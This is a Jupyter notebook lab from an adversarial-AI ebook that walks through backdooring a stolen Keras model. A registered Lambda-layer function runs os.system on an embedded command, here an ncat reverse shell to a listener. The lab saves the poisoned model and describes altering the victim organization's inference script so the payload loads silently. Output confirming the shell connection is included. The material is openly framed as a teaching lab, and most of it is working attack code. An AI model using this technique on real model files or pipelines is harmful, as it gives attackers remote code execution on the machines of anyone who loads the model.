{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "57ee124d",
   "metadata": {},
   "source": [
    "<img style=\"max-width:20em; height:auto;\" src=\"../graphics/A-Little-Book-on-Adversarial-AI-Cover.png\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "afd536ac",
   "metadata": {},
   "source": [
    "Author: Nik Alleyne   \n",
    "Author Blog: https://www.securitynik.com   \n",
    "Author GitHub: github.com/securitynik   \n",
    "\n",
    "Author Other Books: [   \n",
    "\n",
    "            \"https://www.amazon.ca/Learning-Practicing-Leveraging-Practical-Detection/dp/1731254458/\",   \n",
    "            \n",
    "            \"https://www.amazon.ca/Learning-Practicing-Mastering-Network-Forensics/dp/1775383024/\"   \n",
    "        ]   \n",
    "\n",
    "\n",
    "This notebook ***(attacking_lambda_layers_cmd.ipynb)*** is part of the series of notebooks From ***A Little Book on Adversarial AI***  A free ebook released by Nik Alleyne"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "34e87c61",
   "metadata": {},
   "source": [
    "**Building on Lambda**     \n",
    "***Attacking_Lambda_Layers.ipynb**  \n",
    "\n",
    "- Assuming we have stolen or gained access to the script used to load the model and make prediction ..."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fdd35e14",
   "metadata": {},
   "source": [
    "### Lab Objectives:   \n",
    "- Build on our learning about Keras Lambda layer   \n",
    "- Learn how we can attach malicious code to a model using the Lambda layer    \n",
    "- Learn how to use *@keras.saving.register_keras_serializable()* decorator   \n",
    "- Learn how to manipulate an organization's inference script  \n",
    "\n",
    "\n",
    "### Step 1:  "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "21427ca7",
   "metadata": {},
   "source": [
    "The base script which the organization uses to make predictions is **tf_make_predictions_base_script.py**\n",
    "\n",
    "**Note!** Copy this to a python file and run it from the command line. Let's say we gained access to the script file: **tf_make_predictions_base_script.py**     \n",
    "\n",
    "Open a terminal and run the script   \n",
    "**Do not run it from within this notebook**    \n",
    "\n",
    "If you run it from this notebook, it will still give you the error but this is not what we want. The organization is more than likely not running their code through Jupyter but instead as a script outside of Jupyter.  When the organization tries to run our model, it will fail"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "26230733",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2025-08-01 20:42:53.926783: I tensorflow/core/util/port.cc:153] oneDNN custom operations are on. You may see slightly different numerical results due to floating-point round-off errors from different computation orders. To turn them off, set the environment variable `TF_ENABLE_ONEDNN_OPTS=0`.\n",
      "2025-08-01 20:42:53.947408: E external/local_xla/xla/stream_executor/cuda/cuda_fft.cc:467] Unable to register cuFFT factory: Attempting to register factory for plugin cuFFT when one has already been registered\n",
      "WARNING: All log messages before absl::InitializeLog() is called are written to STDERR\n",
      "E0000 00:00:1754095373.982762    7976 cuda_dnn.cc:8579] Unable to register cuDNN factory: Attempting to register factory for plugin cuDNN when one has already been registered\n",
      "E0000 00:00:1754095373.994905    7976 cuda_blas.cc:1407] Unable to register cuBLAS factory: Attempting to register factory for plugin cuBLAS when one has already been registered\n",
      "W0000 00:00:1754095374.026836    7976 computation_placer.cc:177] computation placer already registered. Please check linkage and avoid linking the same target more than once.\n",
      "W0000 00:00:1754095374.026944    7976 computation_placer.cc:177] computation placer already registered. Please check linkage and avoid linking the same target more than once.\n",
      "W0000 00:00:1754095374.026955    7976 computation_placer.cc:177] computation placer already registered. Please check linkage and avoid linking the same target more than once.\n",
      "W0000 00:00:1754095374.026960    7976 computation_placer.cc:177] computation placer already registered. Please check linkage and avoid linking the same target more than once.\n",
      "2025-08-01 20:42:54.035239: I tensorflow/core/platform/cpu_feature_guard.cc:210] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.\n",
      "To enable the following instructions: AVX2 AVX512F AVX512_VNNI AVX512_BF16 AVX_VNNI FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.\n",
      "\u001b[H\u001b[2JNumber of arguments passed: 2\n",
      "**************************************************\n",
      "Ready to make your predictions!\n",
      "**************************************************\n",
      "Loading model... /tmp/zeek_pwnd.keras\n",
      "W0000 00:00:1754095382.746072    7976 gpu_device.cc:2430] TensorFlow was not built with CUDA kernel binaries compatible with compute capability 12.0. CUDA kernels will be jit-compiled from PTX, which could take 30 minutes or longer.\n",
      "W0000 00:00:1754095382.767374    7976 gpu_device.cc:2430] TensorFlow was not built with CUDA kernel binaries compatible with compute capability 12.0. CUDA kernels will be jit-compiled from PTX, which could take 30 minutes or longer.\n",
      "I0000 00:00:1754095383.067048    7976 gpu_device.cc:2019] Created device /job:localhost/replica:0/task:0/device:GPU:0 with 13159 MB memory:  -> device: 0, name: NVIDIA GeForce RTX 5080 Laptop GPU, pci bus id: 0000:64:00.0, compute capability: 12.0\n",
      "2025-08-01 20:43:04.913890: W tensorflow/compiler/mlir/tools/kernel_gen/tf_gpu_runtime_wrappers.cc:40] 'cuModuleLoadData(&module, data)' failed with 'CUDA_ERROR_INVALID_PTX'\n",
      "\n",
      "2025-08-01 20:43:04.914012: W tensorflow/compiler/mlir/tools/kernel_gen/tf_gpu_runtime_wrappers.cc:40] 'cuModuleGetFunction(&function, module, kernel_name)' failed with 'CUDA_ERROR_INVALID_HANDLE'\n",
      "\n",
      "2025-08-01 20:43:04.914109: W tensorflow/core/framework/op_kernel.cc:1844] INTERNAL: 'cuLaunchKernel(function, gridX, gridY, gridZ, blockX, blockY, blockZ, 0, reinterpret_cast<CUstream>(stream), params, nullptr)' failed with 'CUDA_ERROR_INVALID_HANDLE'\n",
      "2025-08-01 20:43:04.914184: I tensorflow/core/framework/local_rendezvous.cc:407] Local rendezvous is aborting with status: INTERNAL: 'cuLaunchKernel(function, gridX, gridY, gridZ, blockX, blockY, blockZ, 0, reinterpret_cast<CUstream>(stream), params, nullptr)' failed with 'CUDA_ERROR_INVALID_HANDLE'\n",
      "Traceback (most recent call last):\n",
      "  File \"/mnt/d/Little Book on Adversarial AI/labs/tf_make_predictions_base_script.py\", line 62, in <module>\n",
      "    loaded_model = tf.keras.models.load_model(filepath=cmd_args.model)\n",
      "                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/saving/saving_api.py\", line 189, in load_model\n",
      "    return saving_lib.load_model(\n",
      "           ^^^^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/saving/saving_lib.py\", line 370, in load_model\n",
      "    return _load_model_from_fileobj(\n",
      "           ^^^^^^^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/saving/saving_lib.py\", line 447, in _load_model_from_fileobj\n",
      "    model = _model_from_config(\n",
      "            ^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/saving/saving_lib.py\", line 436, in _model_from_config\n",
      "    model = deserialize_keras_object(\n",
      "            ^^^^^^^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/saving/serialization_lib.py\", line 718, in deserialize_keras_object\n",
      "    instance = cls.from_config(inner_config)\n",
      "               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/models/sequential.py\", line 371, in from_config\n",
      "    layer = serialization_lib.deserialize_keras_object(\n",
      "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/saving/serialization_lib.py\", line 730, in deserialize_keras_object\n",
      "    instance.build_from_config(build_config)\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/layers/layer.py\", line 481, in build_from_config\n",
      "    self.build(config[\"input_shape\"])\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/layers/layer.py\", line 232, in build_wrapper\n",
      "    original_build_method(*args, **kwargs)\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/layers/core/dense.py\", line 116, in build\n",
      "    self._kernel = self.add_weight(\n",
      "                   ^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/layers/layer.py\", line 575, in add_weight\n",
      "    variable = backend.Variable(\n",
      "               ^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/backend/common/variables.py\", line 206, in __init__\n",
      "    self._initialize_with_initializer(initializer)\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/backend/tensorflow/core.py\", line 52, in _initialize_with_initializer\n",
      "    self._initialize(lambda: initializer(self._shape, dtype=self._dtype))\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/backend/tensorflow/core.py\", line 42, in _initialize\n",
      "    self._value = tf.Variable(\n",
      "                  ^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/tensorflow/python/util/traceback_utils.py\", line 153, in error_handler\n",
      "    raise e.with_traceback(filtered_tb) from None\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/backend/tensorflow/core.py\", line 52, in <lambda>\n",
      "    self._initialize(lambda: initializer(self._shape, dtype=self._dtype))\n",
      "                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/initializers/random_initializers.py\", line 306, in __call__\n",
      "    return random.uniform(\n",
      "           ^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/backend/tensorflow/random.py\", line 33, in uniform\n",
      "    seed = _cast_seed(draw_seed(seed))\n",
      "                      ^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/random/seed_generator.py\", line 154, in draw_seed\n",
      "    return convert_to_tensor([seed, 0], dtype=random_seed_dtype())\n",
      "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/backend/tensorflow/core.py\", line 152, in convert_to_tensor\n",
      "    return tf.cast(x, dtype)\n",
      "           ^^^^^^^^^^^^^^^^^\n",
      "tensorflow.python.framework.errors_impl.InternalError: {{function_node __wrapped__Cast_device_/job:localhost/replica:0/task:0/device:GPU:0}} 'cuLaunchKernel(function, gridX, gridY, gridZ, blockX, blockY, blockZ, 0, reinterpret_cast<CUstream>(stream), params, nullptr)' failed with 'CUDA_ERROR_INVALID_HANDLE' [Op:Cast] name: \n"
     ]
    }
   ],
   "source": [
    "# Remember to run this from your command line.  \n",
    "# This is the organization running their script\n",
    "# This script fails as shown below\n",
    "\n",
    "!python tf_make_predictions_base_script.py --model /tmp/zeek_pwnd.keras --data \"[[0.5, 0.2, 0.1, 0.3, 0.4, 0.2, 0.5]]\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "28470303",
   "metadata": {},
   "source": [
    "**Your error should look something like:**   \n",
    "*config={'module': 'keras.layers', 'class_name': 'Lambda', 'config': {'name': 'malicious_layer', 'trainable': True, 'dtype': {'module': 'keras', 'class_name': 'DTypePolicy', 'config': {'name': 'float32'}, 'registered_name': None}, 'function': {'module': 'builtins', 'class_name': 'function', 'config': 'malicious_payload>malicious_payload', 'registered_name': 'function'}, 'arguments': {'command': 'pwd'}}, 'registered_name': None, 'build_config': {'input_shape': [None, 1]}}.*\n",
    "\n",
    "*Exception encountered: Could not locate function 'malicious_payload>malicious_payload'. Make sure custom classes are decorated with `@keras.saving.register_keras_serializable()`. Full object config: {'module': 'builtins', 'class_name': 'function', 'config': 'malicious_payload>malicious_payload', 'registered_name': 'function'}*\n",
    "\n",
    "We don't wish for the organization to get this error when they run their model via the script, obviously they will recognize there is a problem here. \n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bb11ff79",
   "metadata": {},
   "source": [
    "Let us now modify the organization base script  \n",
    "We will give the modified script a different name\n",
    "All we need to do, is copy our malicious function into the script and modify the arguments if we wish. \n",
    "We will do it two ways. Let's us set a default argument that allows it to setup a reverse shell\n",
    "and the second way, YoU if you wish can add another argument that allows you to run any command you would like via the model \n",
    "\n",
    "**Note:** Remember to setup your listener on your remote host before running this script\n",
    "**ncat --verbose --listen 9999 --ssl**\n",
    "\n",
    "- In the previous lab, we used command as {'command' : 'pwd' }   \n",
    "- Let's give it our shell as the default.\n",
    "    **{'command' : 'ncat --verbose 127.0.0.1 9999 --exec /bin/sh --ssl &'}**\n",
    "\n",
    "- Do you remember seeing this line in the previous lab? This is what we will be using   \n",
    "**malicious_layer = tf.keras.layers.Lambda(function=malicious_payload, name='malicious_layer', arguments={'command' : 'ncat --verbose 127.0.0.1 9999 --exec /bin/sh --ssl &'})**\n",
    "\n",
    "Now let's modify the base script and rename it to:  \n",
    "**tf_make_predictions_pwnd_script_lambda.py**   \n",
    "\n",
    "\n",
    "Time to get our model  \n",
    "\n",
    "### Step 2:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "a88152d3",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import tensorflow\n",
    "import tensorflow as tf"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "c6483c85",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[-] Disabling the GPU\n",
      "[*] Current logical devices: [LogicalDevice(name='/device:CPU:0', device_type='CPU')]\n",
      "[*] Current physical devices: [PhysicalDevice(name='/physical_device:GPU:0', device_type='GPU')]\n"
     ]
    }
   ],
   "source": [
    "# On my system, there is a compatibility issue between my Cuda and Tensorflow\n",
    "# As a result I disable the GPU by default for Tensorflow.\n",
    "# If Tensorflow is working fine on your system, then feel free to comment out the lines below\n",
    "\n",
    "# Comment out this line if your GPU works fine in Tensorflow \n",
    "print(f'[-] Disabling the GPU')\n",
    "tf.config.set_visible_devices(devices=[], device_type='GPU')\n",
    "\n",
    "print(f'[*] Current logical devices: {tf.config.list_logical_devices()}')\n",
    "print(f'[*] Current physical devices: {tf.config.list_physical_devices(device_type='GPU')}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "d381906b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Tensorflow version used:  2.19.0\n"
     ]
    }
   ],
   "source": [
    "### Version of key libraries used  \n",
    "print(f'Tensorflow version used:  {tf.__version__}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "4f2a5327",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Sequential name=simple_model, built=True>"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Load the victim model .. again\n",
    "loaded_model = tf.keras.models.load_model(filepath='/tmp/zeek_model.keras')\n",
    "loaded_model"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9b0f7743",
   "metadata": {},
   "source": [
    "We the model in place, time to register our custom object and at the same time create our malicious function and add the lambda layer. \n",
    "\n",
    "\n",
    "### Step 3:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "2edc5347",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Define a function to use with the lambda layer\n",
    "# If there were any previously registered custom objects, we can clear any previously registered custom objects as follow\n",
    "tf.keras.utils.get_custom_objects().clear()\n",
    "\n",
    "# To ensure this function is properly registered when saving the model, let's add this decorator\n",
    "# I made a small change to the name by adding the _cmd to the package and name. \n",
    "# We need unique layer names in the model\n",
    "\n",
    "@tf.keras.utils.register_keras_serializable(package=\"malicious_payload_cmd\", name=\"malicious_payload_cmd\")\n",
    "def malicious_payload(incoming_tensor, command):\n",
    "    '''\n",
    "    Lambda layer requires a function.\n",
    "    Args:\n",
    "        incoming_tensor (tensor): This is the tensor coming from the previous layer. \n",
    "                         We will not modify this. This should pass through\n",
    "        command (str):  The command we wish to execute\n",
    "    '''\n",
    "    # Import os because we would like the function to be self contained\n",
    "    import os\n",
    "\n",
    "    # Execute the command passed\n",
    "    os.system(command)\n",
    "    return incoming_tensor\n",
    "\n",
    "#malicious_payload()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "5adb10a2",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Lambda name=malicious_layer_cmd, built=False>"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Define he malicious lambda layer\n",
    "# Lambda layer: https://keras.io/api/layers/core_layers/lambda/\n",
    "\n",
    "# In the next run, we will use this. For now, stick with the line above\n",
    "# change the name again to add *_cmd*\n",
    "malicious_layer = tf.keras.layers.Lambda(function=malicious_payload, name='malicious_layer_cmd', arguments={'command' : 'ncat --verbose 127.0.0.1 9999 --exec /bin/sh --ssl &'})\n",
    "\n",
    "malicious_layer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "4c72ae2c",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Ncat: Version 7.94SVN ( https://nmap.org/ncat )\n"
     ]
    }
   ],
   "source": [
    "'''\n",
    "Modify the stolen model\n",
    "Add the malicious layer to the pretrained model\n",
    "We also see the results printed from our command. \n",
    "'''\n",
    "# You should already have a connection here\n",
    "loaded_model.add(malicious_layer)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "b44fe9b7",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Ncat: Subject: CN=localhost\n",
      "Ncat: Issuer: CN=localhost\n",
      "Ncat: SHA-1 fingerprint: CD8F C079 7523 F3A7 FE61 F95C 9B78 0A97 D838 7E6D\n",
      "Ncat: Certificate verification failed (self-signed certificate).\n",
      "Ncat: SSL connection to 127.0.0.1:9999.\n",
      "Ncat: SHA-1 fingerprint: CD8F C079 7523 F3A7 FE61 F95C 9B78 0A97 D838 7E6D\n"
     ]
    }
   ],
   "source": [
    "# Save the compromised model to be accessed via the cmd\n",
    "tf.keras.models.save_model(model=loaded_model, filepath=r'/tmp/zeek_pwnd_cmd.keras', overwrite=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b7f3dd51",
   "metadata": {},
   "source": [
    "### Lab Takeaways:  \n",
    "- We were able to build on what we previously learned about lambda layers  \n",
    "- We modified the inference script. \n",
    "- We still, however, has lots more work to do.  "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f9e12886",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "adversarial_ai",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
